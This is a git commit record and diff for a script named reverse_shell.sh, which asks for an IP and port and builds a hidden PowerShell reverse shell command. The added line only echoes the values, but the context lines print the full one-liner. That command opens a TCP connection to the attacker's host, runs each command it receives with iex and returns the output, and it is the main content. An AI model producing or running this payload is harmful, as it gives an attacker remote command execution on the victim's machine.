aa79fb85301f1adc9363515a9a1e92d82ea72fff
C04CH <88205891+c04ch1337@users.noreply.github.com>
2025-06-13 15:56:43 -0500

    Update reverse_shell.sh

--- reverse_shell.sh
+++ reverse_shell.sh
@@ -2,6 +2,7 @@
 
 read -p "Enter your IP: " IP
 read -p "Enter your Port: " PORT
+echo "Payloads will use IP: $IP and Port: $PORT"
 
 echo "[*] Generating base64 PowerShell reverse shell..."
 PS_COMMAND="powershell -nop -w hidden -c \"$client = New-Object System.Net.Sockets.TCPClient('$IP',$PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}\"
